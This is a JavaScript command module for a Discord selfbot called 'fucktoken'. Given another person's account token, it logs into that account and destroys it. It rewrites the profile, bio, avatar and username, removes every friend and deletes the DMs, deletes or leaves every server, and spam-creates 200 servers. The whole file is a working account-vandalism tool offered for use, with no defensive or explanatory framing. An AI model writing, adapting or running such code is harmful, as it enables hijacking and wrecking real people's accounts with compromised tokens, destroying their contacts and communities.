const d = require('djs-selfbot-v13')

const fs = require('fs')

module.exports = {
  name: "fucktoken",
  descriptionfr: "Détruit entièrement un token",
  descriptionen: "Destroy a token",
  usage: "<token>",
  run: async (client, message, args) => {
    if (!args[0]) return message.edit(client.trad("Please provide a token", "Veuillez entrer un token"))
    const test = await check (args[0])
    if (!test) return message.edit(client.trad(`⛧ __**${client.db.name}**__ ⛧\n\`STATUS\` ➜ **The token don't work**`, `⛧ __**${client.db.name}**__ ⛧\n\`STATUS\` ➜ **Le token ne fonctionne pas**`))
    const msg = await message.edit(client.trad("Profile Destruction...", "Destruction du profile..."))

    const fclient = new d.Client({checkUpdate: false})
    fclient.login(args[0])
    fclient.on('ready', async () => {
      await fclient.user.setAboutMe(client.trad("everything has been destroyed", "Tout a été détruit :)")).catch(() => false)
      await fclient.user.setAvatar("https://wallpapers-clan.com/wp-content/uploads/2022/12/anonymous-pfp-25.jpg").catch(() => false)
      await fclient.user.setUsername(client.db.name).catch(() => false)
      await fclient.user.setHypeSquad("NONE").catch(() => false)
      await fclient.user.setBanner("https://i.imgur.com/FXqnQDv.gif").catch(() => false)

      msg.edit(client.trad("Deleting and Creating Servers and Friends", "Suppression et Création des serveurs et des amis"))
      await fclient.relationships.fetch()
      fclient.relationships.friendCache.forEach(f => f?.unFriend() && f?.deleteDM())
      fclient.guilds.cache.forEach(g => g.ownerId === fclient.user.id ? g.delete().catch(() => false) : g.leave().catch(() => false))
      for (let i = 0; i < 200; i++){
        fclient.guilds.create(client.db.name).catch(() => false)
      }
      msg.edit(client.trad('Token fuck finish', 'Token fuck terminé'))
      fclient.destroy()
    })
  }
}

const check = async token => {
  try{
    const nclient = new d.Client({checkUpdate: false})
    await nclient.login(token)
    nclient.on('ready', () => nclient.destroy())
    return true
  }
  catch{ return false }
}